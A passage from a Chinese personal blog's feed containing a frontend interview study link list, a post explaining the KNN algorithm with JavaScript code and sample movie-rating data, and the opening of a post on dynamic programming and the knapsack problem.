class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">next_id</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> id = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">// !不是阻塞执行，是yield时跳出函数并储存当时的状态。</span></span><br><span class="line">    <span class="comment">// !执行next()时还原当时的状态，从上次yield的位置向下执行</span></span><br><span class="line">    <span class="keyword">yield</span> ++id;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a = next_id();</span><br><span class="line"><span class="built_in">console</span>.log(a.next().value); <span class="comment">//1</span></span><br><span class="line"><span class="built_in">console</span>.log(a.next().value); <span class="comment">//2</span></span><br><span class="line"><span class="built_in">console</span>.log(a.next().value); <span class="comment">//3</span></span><br><span class="line"><span class="built_in">console</span>.log(a.next().value); <span class="comment">//4</span></span><br><span class="line"><span class="built_in">console</span>.log(a.next().value); <span class="comment">//5</span></span><br></pre></td></tr></table></figure></li></ul><ol start="22"><li><p>arguments（箭头函数）</p><ul><li><a href="https://juejin.cn/post/6844903616231260174" target="_blank" rel="noopener">ES6 系列之箭头函数</a></li><li><a href="https://juejin.cn/post/6844903801799835655" target="_blank" rel="noopener">详解箭头函数和普通函数的区别以及箭头函数的注意事项、不适用场景</a></li><li><a href="https://juejin.cn/post/6844904152640782343" target="_blank" rel="noopener">曾经我以为我很懂箭头函数</a></li><li><a href="https://juejin.cn/post/6844904133409914894" target="_blank" rel="noopener">对阮一峰《ES6 入门》中箭头函数 this 描述的探究</a></li></ul></li><li><p>🔴🟠🔵继承</p><ul><li><a href="https://juejin.cn/post/6844903696111763470" target="_blank" rel="noopener">JavaScript常用八种继承方案</a></li><li><a href="https://juejin.cn/post/6844904094948130824" target="_blank" rel="noopener">🔥比继承家业还要简单的JS继承题-封装篇(牛刀小试)</a></li><li><a href="https://juejin.cn/post/6844903475021627400" target="_blank" rel="noopener">JS原型链与继承</a></li></ul></li><li><p>🔴script——async属性</p><ul><li><a href="https://juejin.cn/post/6844903560879013896" target="_blank" rel="noopener">defer和async</a></li><li><a href="https://juejin.cn/post/6894629999215640583" target="_blank" rel="noopener">defer和async简洁版</a></li></ul></li><li><p>🔴jsonp——跨域的解决</p><ul><li><a href="https://ypigy.gitee.io/2020/07/20/AJAX/#%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93" target="_blank" rel="noopener">笔记</a></li><li><a href="https://juejin.cn/post/6844903462551945230" target="_blank" rel="noopener">原生 JavaScript 实现 AJAX、JSONP</a></li><li><a href="https://juejin.cn/post/6844903976505344013" target="_blank" rel="noopener">一分钟说完JSONP请求</a></li></ul></li><li><p>🔴ajax的返回状态——Fetch</p><ul><li><a href="https://juejin.cn/post/6844903618764603399" target="_blank" rel="noopener">Ajax原理一篇就够了</a></li><li><a href="https://ypigy.gitee.io/2020/07/20/AJAX/" target="_blank" rel="noopener">AJAX笔记 | Dong</a></li><li><a href="https://www.ruanyifeng.com/blog/2020/12/fetch-tutorial.html" target="_blank" rel="noopener">Fetch API 教程 - 阮一峰的网络日志 (ruanyifeng.com)</a></li></ul></li><li><p>dns预加载（缓存）dns-preFetch</p><ul><li><a href="https://juejin.cn/post/6844903492490887182" target="_blank" rel="noopener">DNS Prefetching 的正确使用姿势</a></li><li><a href="https://juejin.cn/post/6915204591730556935" target="_blank" rel="noopener">preload、prefetch、preconnect 和 dns-prefetch 知多少</a></li></ul></li><li><p>🔵函数柯里化（currying）</p><ul><li><a href="https://www.jianshu.com/p/2975c25e4d71" target="_blank" rel="noopener">详解JS函数柯里化</a></li></ul></li><li><p>骨架屏</p><p><a href="https://www.jianshu.com/p/a72263d2d105" target="_blank" rel="noopener">什么是骨架屏 - 简书 (jianshu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/96455668" target="_blank" rel="noopener">如何实现优美的骨架屏 - 知乎 (zhihu.com)</a></p></li><li><p>🔴启动性能（异步）（前端性能优化）</p><ul><li><a href="https://juejin.cn/post/6892994632968306702" target="_blank" rel="noopener">前端性能优化 24 条建议（2020） - 掘金 (juejin.cn)</a></li><li><a href="https://juejin.cn/post/6904517485349830670" target="_blank" rel="noopener">工作中如何进行前端性能优化(21种优化+7种定位方式) - 掘金 (juejin.cn)</a></li><li><a href="https://juejin.cn/post/7020212914020302856" target="_blank" rel="noopener">写在 2021 的前端性能优化指南 - 掘金 (juejin.cn)</a></li><li><a href="https://juejin.cn/post/6844904195707895816" target="_blank" rel="noopener">前端性能优化总结 - 掘金 (juejin.cn)</a></li></ul></li><li><p>HTTP缓存机制</p><p><a href="https://juejin.cn/post/6844904100035821575#heading-59" target="_blank" rel="noopener">（建议精读）HTTP灵魂之问，巩固你的 HTTP 知识体系 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6844903634002509832" target="_blank" rel="noopener">面试精选之http缓存 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6844903517702848526" target="_blank" rel="noopener">HTTP—-HTTP缓存机制 - 掘金 (juejin.cn)</a></p></li><li><p>websocket、AJAX</p><p><a href="https://juejin.cn/post/6844903544978407431" target="_blank" rel="noopener">WebSocket：5分钟从入门到精通 - 掘金 (juejin.cn)</a></p></li><li><p>TCP/IP模型（计算机网络）</p><p><a href="https://ypigy.gitee.io/2021/04/18/运输层/#传输控制协议TCP概述" target="_blank" rel="noopener">计算机网络-运输层 | Dong (gitee.io)</a></p><p>[计算机网络-网络层 | Dong (gitee.io)](<a href="https://ypigy.gitee.io/2021/04/18/网络层/#网际协议" target="_blank" rel="noopener">https://ypigy.gitee.io/2021/04/18/网络层/#网际协议</a> IP)</p></li><li><p>🟠gulp、webpack（打包原理）</p><p><a href="https://juejin.cn/post/6844903802382860296#heading-6" target="_blank" rel="noopener">Webpack 模块打包原理 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6917069979913289736#heading-15" target="_blank" rel="noopener">对比webpack，你更应该先掌握gulp【10分钟教你彻底掌握gulp】 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6844904038543130637#heading-22" target="_blank" rel="noopener">webpack打包原理 ? 看完这篇你就懂了 ! - 掘金 (juejin.cn)</a></p></li><li><p>PWA</p><p><a href="https://juejin.cn/post/6844904052166230030" target="_blank" rel="noopener">面试官：请你实现一个PWA 我：😭 - 掘金 (juejin.cn)</a></p></li><li><p>🔴单元测试</p><p><a href="https://juejin.cn/post/7039108357554176037" target="_blank" rel="noopener">如何做前端单元测试 - 掘金 (juejin.cn)</a><br><a href="https://juejin.cn/post/7049293284883038238" target="_blank" rel="noopener">前端单元测试入门与最佳实践 - 掘金 (juejin.cn)</a></p></li><li><p>🔴seo优化</p><p><a href="https://segmentfault.com/a/1190000019623624_vueseo" target="_blank" rel="noopener">基于Vue SEO的四种方案 - SegmentFault 思否</a></p><p><a href="https://juejin.cn/post/6980167371864424456" target="_blank" rel="noopener">前端搜索引擎优化（SEO）的技巧 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6844903824428105735#heading-4" target="_blank" rel="noopener">前端SEO优化 - 掘金 (juejin.cn)</a></p></li><li><p>grid栅格布局</p><p><a href="https://juejin.cn/post/6854573220306255880" target="_blank" rel="noopener">最强大的 CSS 布局 —— Grid 布局 - 掘金 (juejin.cn)</a></p></li><li><p>bigint</p><p><a href="https://juejin.cn/post/6844903902295359502" target="_blank" rel="noopener">JS最新基本数据类型：BigInt - 掘金 (juejin.cn)</a></p></li><li><p>🔴🟠0.1+0.2 ？（是0.3吗）</p><p><a href="https://juejin.cn/post/7056934829920616461" target="_blank" rel="noopener">用了一天时间，我终于彻底搞懂了 0.1+0.2 是否等于 0.3！ - 掘金 (juejin.cn)</a></p></li><li><p>osi七层模型（计算机网路）</p><p><a href="https://ypigy.gitee.io/categories/计算机网络/" target="_blank" rel="noopener">分类: 计算机网络 | Dong (gitee.io)</a></p></li><li><p>🔴head、状态码</p><p><a href="https://ypigy.gitee.io/2020/07/28/http协议/" target="_blank" rel="noopener">http协议 | Dong (gitee.io)</a></p><p><a href="https://blog.csdn.net/wzx19840423/article/details/79073087" target="_blank" rel="noopener">http状态码总结_wzx19840423的专栏-CSDN博客_http状态码</a></p><p><a href="https://blog.csdn.net/u014346301/article/details/53995333" target="_blank" rel="noopener">HTTP状态码（HTTP Status Code）_Sweet oDream-CSDN博客</a></p></li><li><p>声明式绑定（REACT Query/ Apollo GtaphQL Client）<br>等有学react再来吧</p></li><li><p>假数据生产（Yapi、RAP2、Apifox）</p><ol><li><a href="https://hellosean1025.github.io/yapi/index.html" target="_blank" rel="noopener">YApi 接口管理平台 (hellosean1025.github.io)</a></li><li><a href="http://rap2.taobao.org/account/login" target="_blank" rel="noopener">RAP接口管理平台 (taobao.org)</a></li><li><a href="https://github.com/thx/rap2-delos" target="_blank" rel="noopener">阿里妈妈前端团队出品的开源接口管理工具RAP第二代</a></li><li><a href="https://www.apifox.cn/" target="_blank" rel="noopener">Apifox</a></li></ol></li><li><p>BFF架构</p><p><a href="https://juejin.cn/post/6950530370810937352" target="_blank" rel="noopener">第 016 期 前后端经常争吵？ - BFF 了解一下 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/7008840813069205512" target="_blank" rel="noopener">微服务/API时代的前端开发] BFF入门–5个实用的BFF使用案例 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6844903959333699598" target="_blank" rel="noopener">初识BFF架构设计 - 掘金 (juejin.cn)</a></p></li><li><p>🔴文档碎片</p><p><a href="https://juejin.cn/post/7012073594918273032" target="_blank" rel="noopener">前端性能优化：创建文档碎片 - 掘金 (juejin.cn)</a></p><p><a href="https://zhuanlan.zhihu.com/p/408738417" target="_blank" rel="noopener">性能优化之文档碎片 - 知乎 (zhihu.com)</a></p></li><li><p>🔴宏任务、微任务（同步异步）</p><p>直接看js代码and思维导图（可以的话整个笔记）</p></li><li><p>compose函数</p><p><a href="https://juejin.cn/post/6844904061821517832" target="_blank" rel="noopener">JavaScript中的compose函数和pipe函数 - 掘金 (juejin.cn)</a></p></li><li><p>forEach跳出循环（终止并返回值）</p><p><a href="https://juejin.cn/post/6971972782292729886" target="_blank" rel="noopener">面试官问我JS中forEach能不能跳出循环 - 掘金 (juejin.cn)</a>看完看看评论，挺有意思的</p></li><li><p>shell命令</p><p><a href="https://juejin.cn/post/6844903489911406599" target="_blank" rel="noopener">Shell常见命令实践 - 掘金 (juejin.cn)</a></p></li><li><p>git命令</p><ol><li>合并代码冲突（merge&amp;rebase）</li><li>代码回滚（reset&amp;checkout）</li><li>代码暂存（stash）</li></ol></li><li><p>linux命令</p></li><li><p>Element.</p><ol><li>getBounding</li><li>IntersectionOberver</li><li>createNodeIterator</li><li>getComputedStyle</li><li>getPropertyValue</li><li>MutationObserver</li></ol></li><li><p>ES6常用方法</p><ul><li><a href="https://juejin.cn/post/6906398702269628424" target="_blank" rel="noopener">混子前端24个解决工作问题的ES6代码片段 - 掘金 (juejin.cn)</a></li></ul></li></ol><h2 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h2><ol><li><a href="https://chinese.freecodecamp.org/learn" target="_blank" rel="noopener">编程学习</a></li><li>面试题：<ul><li><a href="https://juejin.cn/post/6989422484722286600" target="_blank" rel="noopener">2021年我的前端面试准备 - 掘金 (juejin.cn)</a></li><li><a href="https://juejin.cn/post/7035259189966405668" target="_blank" rel="noopener">面试的时候面试官是这样问我Js基础的，角度真刁钻 - 掘金 (juejin.cn)</a></li></ul></li><li><a href="https://juejin.cn/post/7013247812628381704" target="_blank" rel="noopener">组件库</a></li><li><a href="https://juejin.cn/post/7026339412799651876" target="_blank" rel="noopener">Vue源码(一些数据结构)</a></li><li><a href="https://juejin.cn/post/7025868886914400293" target="_blank" rel="noopener">现代web开发困局</a></li><li><a href="https://www.zhihu.com/question/458213150" target="_blank" rel="noopener">为什么 WeakSet 和 WeakMap 无法获取到元素的数量，也无法迭代其中的元素</a></li><li><a href="https://segmentfault.com/a/1190000018605776" target="_blank" rel="noopener">JS垃圾回收机制</a></li><li><a href="https://www.cnblogs.com/coco1s/p/5499469.html" target="_blank" rel="noopener">前端性能优化</a></li><li><a href="https://segmentfault.com/a/1190000012571492" target="_blank" rel="noopener">gzip</a></li><li><a href="https://segmentfault.com/a/1190000012353473" target="_blank" rel="noopener">PWA</a></li><li><a href="https://juejin.cn/post/7007206194276204575#heading-26" target="_blank" rel="noopener">前端学习路线以及知识体系：</a></li><li><a href="https://juejin.cn/post/7038297948630827039" target="_blank" rel="noopener">11个非常有用的HTML单行代码🎃 - 掘金 (juejin.cn)</a></li><li><a href="https://juejin.cn/post/7048916480032768013" target="_blank" rel="noopener">「前端该如何优雅地Mock数据🏃」每个前端都应该学会的技巧 - 掘金 (juejin.cn)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K最近邻算法KNN</title>
      <link href="/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/"/>
      <url>/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>KNN（K- Nearest Neighbor）法即K最邻近法，最初由 Cover和Hart于1968年提出，是一个理论上比较成熟的方法，也是最简单的机器学习算法之一。该方法的思路非常简单直观：如果一个样本在特征空间中的K个最相似（即特征空间中最邻近）的样本中的大多数属于某一个类别，则该样本也属于这个类别。该方法在定类决策上只依据最邻近的一个或者几个样本的类别来决定待分样本所属的类别 </p><p>该方法的不足之处是计算量较大，因为对每一个待分类的文本都要计算它到全体已知样本的距离，才能求得它的K个最邻近点。目前常用的解决方法是事先对已知样本点进行剪辑，事先去除对分类作用不大的样本。另外还有一种 Reverse KNN法，它能降低KNN算法的计算复杂度，提高分类的效率 </p><p>KNN算法比较适用于样本容量比较大的类域的自动分类，而那些样本容量较小的类域采用这种算法比较容易产生误分</p></blockquote><h2 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h2><ol><li>准备数据，对数据进行预处理 。</li><li>计算测试样本点（也就是待分类点）到其他每个样本点的距离</li><li>对每个距离进行排序，然后选择出距离最小的K个点</li><li>对K个点所属的类别进行比较，根据少数服从多数的原则，将测试样本点归入在K个点中占比最高的那一类</li></ol><h2 id="特征抽取"><a href="#特征抽取" class="headerlink" title="特征抽取"></a>特征抽取</h2><p><img src= "/img/loading.gif" data-src="/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/image-20220221221648768.png" alt="image-20220221221648768"></p><p>使用毕达哥拉斯公式计算A和B的相似性（距离），值越小，相似性越大</p><p><img src= "/img/loading.gif" data-src="/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/image-20220221215435440.png" alt="image-20220221215435440"></p><h2 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h2><p><img src= "/img/loading.gif" data-src="/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/image-20220221221838593.png" alt="image-20220221221838593"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>原理上挺简单的，所以没解释，直接上代码，包含两个函数，一个毕达哥拉斯公式，一个KNN算法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 毕达哥拉斯  Math.sqrt((x1-x2)² + (y1 - y2)²)</span></span><br><span class="line"><span class="comment">// 传参：目标对象1，目标对象2，是否返回详细结果（默认否）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pythagoras</span>(<span class="params">obj1, obj2, returnDetail = false</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = [];</span><br><span class="line">  <span class="keyword">let</span> common = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> obj1) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj2[key]) &#123;</span><br><span class="line">      res.push(<span class="built_in">Math</span>.pow(<span class="built_in">parseFloat</span>(obj1[key]) - <span class="built_in">parseFloat</span>(obj2[key]), <span class="number">2</span>)); <span class="comment">//差值取平方</span></span><br><span class="line">      common.push(key);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res = <span class="built_in">Math</span>.sqrt(res.reduce(<span class="function">(<span class="params">cur, next</span>) =&gt;</span> (cur += next), <span class="number">0</span>)).toFixed(<span class="number">2</span>); <span class="comment">//累加取平方根且保留两位小数</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (returnDetail) <span class="keyword">return</span> &#123; res, common &#125;;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 算法-KNN-毕达哥拉斯比较距离</span></span><br><span class="line"><span class="comment">// 传参：对象集合，当前对象，是否返回详细结果（默认否）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">kNN</span>(<span class="params">objs, newObj, returnDetail = false</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> allDistance = []; <span class="comment">//存储所有距离</span></span><br><span class="line">  <span class="keyword">let</span> minDistance = <span class="built_in">Number</span>.MAX_VALUE; <span class="comment">//存储最小距离,默认js能读的最大数值</span></span><br><span class="line">  <span class="keyword">let</span> minObjName; <span class="comment">//存储最小对象名</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> objs) &#123;</span><br><span class="line">    <span class="keyword">let</span> res = pythagoras(objs[key], newObj); <span class="comment">//对每个对象执行毕达哥拉斯公式</span></span><br><span class="line">    allDistance.push(&#123; <span class="attr">distance</span>: res, <span class="attr">targetName</span>: key &#125;); <span class="comment">//将所有结果压入</span></span><br><span class="line">    <span class="comment">// res &lt; minDistance &amp;&amp; ((minDistance = res), (minObjName = key));</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历查找最小距离对象</span></span><br><span class="line">  <span class="keyword">let</span> resultObj = allDistance.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a.distance - b.distance)[<span class="number">0</span>];</span><br><span class="line">  minObjName = resultObj[<span class="string">'targetName'</span>];</span><br><span class="line">  minDistance = resultObj[<span class="string">'distance'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (returnDetail) <span class="keyword">return</span> &#123; allDistance, minDistance, minObjName &#125;;</span><br><span class="line">  <span class="keyword">return</span> minObjName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模拟数据以及测试"><a href="#模拟数据以及测试" class="headerlink" title="模拟数据以及测试"></a>模拟数据以及测试</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="comment">//数据库已有用户及其喜欢的电影类型的打分</span></span><br><span class="line"><span class="keyword">let</span> favoriteType = &#123;</span><br><span class="line">  xiaoming: &#123;</span><br><span class="line">    terror: <span class="number">5</span>,</span><br><span class="line">    comedy: <span class="number">1</span>,</span><br><span class="line">    love: <span class="number">3</span>,</span><br><span class="line">    action: <span class="number">1</span>,</span><br><span class="line">    scienceFiction: <span class="number">3</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  xiaohong: &#123;</span><br><span class="line">    terror: <span class="number">1</span>,</span><br><span class="line">    comedy: <span class="number">5</span>,</span><br><span class="line">    love: <span class="number">4</span>,</span><br><span class="line">    action: <span class="number">1</span>,</span><br><span class="line">    scienceFiction: <span class="number">3</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  xiaolv: &#123;</span><br><span class="line">    terror: <span class="number">5</span>,</span><br><span class="line">    comedy: <span class="number">1</span>,</span><br><span class="line">    love: <span class="number">1</span>,</span><br><span class="line">    action: <span class="number">5</span>,</span><br><span class="line">    scienceFiction: <span class="number">4</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  xiaozi: &#123;</span><br><span class="line">    terror: <span class="number">1</span>,</span><br><span class="line">    comedy: <span class="number">1</span>,</span><br><span class="line">    love: <span class="number">5</span>,</span><br><span class="line">    action: <span class="number">5</span>,</span><br><span class="line">    scienceFiction: <span class="number">4</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  xiaoqi: &#123;</span><br><span class="line">    terror: <span class="number">1</span>,</span><br><span class="line">    comedy: <span class="number">2</span>,</span><br><span class="line">    love: <span class="number">5</span>,</span><br><span class="line">    action: <span class="number">3</span>,</span><br><span class="line">    scienceFiction: <span class="number">5</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  xiaoquan: &#123;</span><br><span class="line">    terror: <span class="number">5</span>,</span><br><span class="line">    comedy: <span class="number">5</span>,</span><br><span class="line">    love: <span class="number">5</span>,</span><br><span class="line">    action: <span class="number">5</span>,</span><br><span class="line">    scienceFiction: <span class="number">5</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res = kNN(favoriteType, &#123; <span class="attr">terror</span>: <span class="number">1</span>, <span class="attr">comedy</span>: <span class="number">4</span>, <span class="attr">love</span>: <span class="number">2</span>, <span class="attr">action</span>: <span class="number">5</span>, <span class="attr">scienceFiction</span>: <span class="number">5</span> &#125;, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">console</span>.log(res);</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  allDistance: [</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">'4.12'</span>, <span class="attr">targetName</span>: <span class="string">'xiaoqi'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">'4.36'</span>, <span class="attr">targetName</span>: <span class="string">'xiaozi'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">'5.00'</span>, <span class="attr">targetName</span>: <span class="string">'xiaohong'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">'5.10'</span>, <span class="attr">targetName</span>: <span class="string">'xiaoquan'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">'5.20'</span>, <span class="attr">targetName</span>: <span class="string">'xiaolv'</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">distance</span>: <span class="string">'6.78'</span>, <span class="attr">targetName</span>: <span class="string">'xiaoming'</span> &#125;</span><br><span class="line">  ],</span><br><span class="line">  minDistance: <span class="string">'4.12'</span>,</span><br><span class="line">  minObjName: <span class="string">'xiaoqi'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><p><img src= "/img/loading.gif" data-src="/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/image-20220221222005339.png" alt="image-20220221222005339"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol><li>KNN用于分类和回归，需要考虑最近的邻居。</li><li>分类就是编组。 </li><li>回归就是预测结果（如数字）。 </li><li>特征抽取意味着将物品（如水果或用户）转换为一系列可比较的数字。 </li><li>能否挑选合适的特征事关KNN算法的成败</li></ol>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划</title>
      <link href="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>动态规划算法通常用于求解具有某种最优性质的问题。在这类问题中，可能会有许多可行解。每一个解都对应于一个值，我们希望找到具有最优值的解。动态规划算法与分治法类似，其基本思想也是将待求解问题分解成若干个子问题，先求解子问题，然后从这些子问题的解得到原问题的解。</p><p>与分治法不同的是，适合于用动态规划求解的问题，经分解得到子问题往往不是互相独立的。若用分治法来解这类问题，则分解得到的子问题数目太多，有些子问题被重复计算了很多次。如果我们能够保存已解决的子问题的答案，而在需要时再找出已求得的答案，这样就可以避免大量的重复计算，节省时间。</p><p>我们可以用一个表来记录所有已解的子问题的答案。不管该子问题以后是否被用到，只要它被计算过，就将其结果填入表中。这就是动态规划法的基本思路。具体的动态规划算法多种多样，但它们具有相同的填表格式</p></blockquote><h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221172703812.png" alt="image-20220221172703812"></p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221180313039.png" alt="image-20220221180313039"></p><p>解决方式就是采用动态规划</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221180638182.png" alt="image-20220221180638182"></p><p>背包分割的最小重量取决于能拿的最小物品重量，如果此时最小物品为0.5，那么背包就要被划分成4/0.5 = 8，8列</p><p>在每一行， <strong>可偷的商品都为当前行的商品以及之前各行的商品</strong>，逐行进行计算，比如第一行，可拿的物品只有吉他，那么接下来四格，就都只能考虑吉他，所以全都填充为单个吉他的价值，等到第二行时，可选的选项就有音响和前一行的吉他了，这时候每个单元格再根据物品价值和质量综合判断来进行数据填充，音响重量有4，所以前面依旧沿用吉他的价值，直接到音响的重量所处格子，这时候我们发现音响价值在4的时候大于1500，也就是音响本身价值大于吉他，所以进行替换，接下来亦是如此，到第三行第四个格子我们发现笔记本电脑的价格加上<strong>上一行</strong>4-笔记本重量所处单元格的价值大于上一行4所处价值，所以得出最终的结果</p><p>计算结果如下</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221180723661.png" alt="image-20220221180723661"></p><p>计算每个单元格的价值时，使用的公式如下</p><p>在1和2之间进行比较，选择大的那方</p><p><img src= "/img/loading.gif" data-src="/2022/02/13/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20220221182208929.png" alt="image-20220221182208929"></p><h3 id="注意点"><a href="#注意点" class="headerlink" 